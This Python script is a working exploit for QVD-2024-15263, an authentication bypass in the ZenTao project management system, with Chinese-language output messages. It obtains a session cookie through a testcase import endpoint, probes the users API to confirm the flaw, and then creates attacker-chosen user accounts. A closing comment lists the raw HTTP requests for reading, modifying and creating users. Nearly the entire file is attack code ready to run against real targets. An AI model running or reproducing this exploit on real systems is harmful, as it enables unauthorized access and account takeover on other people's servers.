import requests
import urllib3
urllib3.disable_warnings()
from urllib.parse import urljoin, urlparse
import json
'''
16.x <= 禅道项目管理系统< 18.12（开源版）
6.x <= 禅道项目管理系统< 8.12（企业版）
3.x <= 禅道项目管理系统< 4.12（旗舰版）
'''

class QVD_2024_15263:
    
    def __init__(self, target, proxy) -> None:
        self.target = target
        self.proxy = proxy
        self.verify = False
        self.timeout = 10
        self.allow_redirects = False
        self.headers = {
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
            'Upgrade-Insecure-Requests': '1',
        }
        self.params = {
            'm': 'testcase',
            'f': 'savexmindimport',
            'HTTP_X_REQUESTED_WITH': 'XMLHttpRequest',
            'productID': 'upkbbehwgfscwizoglpw',
            'branch': 'zqbcsfncxlpopmrvchsu'
        }

        self.data = {
            "account": "usertest",
            "password": "123qwe!@#",
            "realname": "test",
            "role":"",
            "group":"2"
        }

    def get_routes(self):
        url_parse = urlparse(self.target)
        if url_parse.path:
            for route in ['/max/', '/biz/', '/zentao/']:
                if route in self.target:
                    return f"{url_parse.scheme}://{url_parse.netloc}{route}api.php/v1/users"
                else:
                    return f"{url_parse.scheme}://{url_parse.netloc}/api.php/v1/users"
        else:
            for route in ['/max/', '/biz/', '/zentao/']:
                return f"{url_parse.scheme}://{url_parse.netloc}{route}api.php/v1/users"
            
    def get_route(self):
        paths = ["/", '/zentao/', '/max/', '/biz/']
        # paths = ["/", '/zentao/']
        urls = []
        for path in paths:
            url = urljoin(self.target, path + "api.php")
            urls.append(url)
        return urls
    
    def get_cookie(self):
        try:
            requests.packages.urllib3.disable_warnings()
            # url = urljoin(self.target, "api.php")
            urls = self.get_route()
            for url in urls:
                req = requests.get(url=url, headers=self.headers, timeout=self.timeout, verify=self.verify, params=self.params, allow_redirects=self.allow_redirects, proxies=self.proxy)
                if req.status_code == 200 and 'Set-Cookie' in req.headers and 'zentaosid=' in req.headers['Set-Cookie']:
                    zentaoid = req.headers['Set-Cookie'].split('zentaosid=')[1].split(';')[0]
                    path = req.headers['Set-Cookie'].split('zentaosid=')[1].split(';')[1].split('=')[1].split('/')[1]
                    return zentaoid, path
                else:
                    return "", ""
        except:
            return "", ""

    def check(self):
        res = ""
        err = ""
        try:
           requests.packages.urllib3.disable_warnings()
           zentaoid, path = self.get_cookie()
           header = {"Cookie": f"zentaosid={zentaoid}", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36','Accept-Encoding': 'gzip, deflate'} 
           urls = self.get_route()
           for url in urls:
               url = url + "/v1/users"
               # print(url)
               req = requests.get(url=url, headers=header, timeout=self.timeout, verify=self.verify, allow_redirects=self.allow_redirects, proxies=self.proxy)
               if "error: no company-browse priv" in req.text:
                   v = ""
                   if path == "zentao":
                      v="开源版"
                   elif path == "max":
                      v="旗舰版"
                   elif path == "biz":
                      v="企业版"
                   else:
                      v="默认路由"
                   res = f"[+] {self.target} 存在禅道{v}身份认证绕过漏洞\n\n影响版本:\n    16.x <= 禅道项目管理系统< 18.12(开源版)\n    6.x <= 禅道项目管理系统< 8.12(企业版)\n    3.x <= 禅道项目管理系统< 4.12(旗舰版)\n请尝试继续添加用户！！！"
                   return res, err
               else:
                   res = f"[-] {self.target} 不存在禅道身份认证绕过漏洞"
           return res, err

        except requests.exceptions.RequestException as e:
            err = f"请求失败：{str(e)}"
            return res, err
        

    def add_user(self, username, password):
        # passwd = hashlib.md5(password.encode()).hexdigest()
        res = ""
        err = ""
        try:
            requests.packages.urllib3.disable_warnings()
            zentaoid, path = self.get_cookie()
            header = {'Cookie': f'zentaosid={zentaoid}', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36','Accept-Encoding': 'gzip, deflate', "Content-Type": "application/json"} 
            self.data["account"] = username
            self.data["password"] = password
            self.data["realname"] = username
            print(self.data)
            urls = self.get_route()
            for url in urls:
                url = url + "/v1/users"
                req = requests.post(url=url, json=self.data, headers=header,timeout=self.timeout, verify=self.verify, proxies=self.proxy, allow_redirects=self.allow_redirects)# data=json.dumps(self.data)
                if req.status_code == 403 or req.status_code == 201 or username in req.text:
                    v = ""
                    if path == "zentao":
                        v="开源版"
                    elif path == "max":
                        v="旗舰版"
                    elif path == "biz":
                        v="企业版"
                    else:
                        v="默认路由"
                    res = f"[+] {self.target} 通过QVD-2024-15263漏洞给禅道{v}添加(user={username},pass={password})用户成功!\n"
                    return res, err
                else:
                    res = "[!] QVD-2024-15263漏洞添加用户失败，检查漏洞是否存在！！！\n"
            return res, err 
        except requests.exceptions.RequestException as e:
            err = f"请求失败：{str(e)}"
            return res, err
        

'''
禅道身份认证绕过QVD-2024-15263
一、获取cookie
GET /api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
二、查看用户信息
http://127.0.0.1/api.php/v1/users/id
三、修改用户信息
PUT /api.php/v1/users/1 HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: zentaosid=2096a8f74ab1e2b7211ce133e5e83db0; lang=zh-cn; device=desktop; theme=default
Connection: close
Content-Length: 29

{
    "realname": "admin"
}
四、创建新用户
POST /api.php/v1/users HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: zentaosid=2096a8f74ab1e2b7211ce133e5e83db0; lang=zh-cn; device=desktop; theme=default
Connection: close
Content-Length: 76

{"account": "usertest", "password": "123qwe!@#", "realname": "测试用户"}
'''

